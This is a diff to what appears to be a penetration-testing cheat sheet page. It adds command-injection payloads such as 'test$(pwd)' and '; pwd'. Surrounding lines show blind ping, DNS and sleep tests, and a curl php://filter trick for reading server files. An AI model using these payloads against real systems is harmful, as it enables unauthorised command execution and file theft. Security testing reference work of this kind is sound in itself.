@@ -7,7 +7,7 @@ order: 4
 > **Test for Command Injection**
 
 Prefixs before attack payload (command seperator): | <code> ``, &, &&, ||,  <, >, ;, $() </code>
-Test Visable: | <code> ; ls /ect/passwd or /ect/hosts </code>
+Test Visable: | <code> ; ls /ect/passwd or /ect/hosts <br>test`pwd` <br> test$(pwd) <br> test; pwd <br> test | pwd <br> test && pwd </code>
 Test Blind Ping: | <code> ; ping y.o.ur.ip <br> <br> On your attack system: <br> sudo tcpdump -n host [victimIP] and icmp </code>
 Test Blind DNS: | <code> nslookup (you need a public facing system to see nslookup)</code>
 Test Blind Sleep: | <code> address=127.0.0.1 && sleep 10 </code>
@@ -91,12 +91,11 @@ fimap -u 'http://website/?p=file.html'
 
 {% highlight bash %}
 curl -s "http://localhost/ex1.php?page=php://filter/convert.base64-encode/resource=[resource]" | base64 -d
-{% endhighlight %}
-
+<br>
 Examples:<br>
 /etc/php/7.0/apache2/php.ini
 index.php
-
+{% endhighlight %}
 
 **Auto-Extension (.php) Bypass:**
 * NULL "%00"
